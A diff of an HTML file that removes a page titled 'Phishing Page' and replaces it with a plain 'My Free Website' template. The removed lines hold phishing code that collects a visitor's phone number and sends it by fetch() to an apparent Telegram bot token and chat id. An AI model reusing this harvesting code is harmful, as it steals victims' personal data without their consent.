@@ -1,36 +1,72 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Phishing Page</title>
-    <script>
-        function sendData() {
-            var phoneNumber = document.getElementById('phoneNumber').value;
-            var apiUrl = '8011632915:AAFNoHRuUfn0uvZQ6S33UMhmkBxMtcwC0jM';
-            var chatId = '6812716511';
-            var message = 'New phone number: ' + phoneNumber;
-
-            fetch(apiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            }).then(response => response.json())
-              .then(data => {
-                  console.log('Success:', data);
-              })
-              .catch((error) => {
-                  console.error('Error:', error);
-              });
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Free Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
         }
-    </script>
+        header {
+            background-color: #333;
+            color: white;
+            padding: 1em 0;
+            text-align: center;
+        }
+        nav {
+            text-align: center;
+            margin: 1em 0;
+        }
+        nav a {
+            margin: 0 1em;
+            text-decoration: none;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 1em;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
 </head>
 <body>
-    <h1>Enter Your Phone Number</h1>
-    <input type="text" id="phoneNumber" placeholder="Phone Number">
-    <button onclick="sendData()">Submit</button>
+    <header>
+        <h1>Welcome to My Free Website</h1>
+    </header>
+    <nav>
+        <a href="#home">Home</a>
+        <a href="#about">About</a>
+        <a href="#contact">Contact</a>
+    </nav>
+    <div class="container">
+        <section id="home">
+            <h2>Home</h2>
+            <p>This is the home section of my free website. You can customize this content as you like.</p>
+        </section>
+        <section id="about">
+            <h2>About</h2>
+            <p>This is the about section. You can add information about yourself or your project here.</p>
+        </section>
+        <section id="contact">
+            <h2>Contact</h2>
+            <p>This is the contact section. You can add your contact information here.</p>
+        </section>
+    </div>
+    <footer>
+        <p>&copy; 2025 My Free Website. All rights reserved.</p>
+    </footer>
 </body>
 </html>
